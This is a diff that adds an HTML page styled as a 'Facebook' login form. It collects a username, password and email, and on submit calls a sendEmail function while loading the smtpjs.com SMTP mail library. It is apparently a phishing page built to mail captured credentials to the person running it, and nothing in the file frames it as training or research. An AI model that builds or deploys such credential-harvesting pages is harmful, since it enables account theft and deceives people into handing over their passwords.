@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet"  href="foorm.css">
+</head>
+<body>
+    <h2>
+    Facebook
+    </h2> 
+    
+        <div class="table2">
+    <form onsubmit="sendEmail(); reset(); return false;">
+        <h1>
+            Facebook
+            </h1>       
+       <input type="text" id="Username" placeholder="Username" required><br><br>
+         <input type="password" id="passsword" placeholder="passsword" required><br><br>
+         <input type="email" id="email" placeholder="email" required><br><br>
+         Submit:<input type="submit">
+        reset:<input type="reset">
+    </form> 
+    </div>
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+    <script src="foorm.js">
+    </script>
+</body>
+</html>
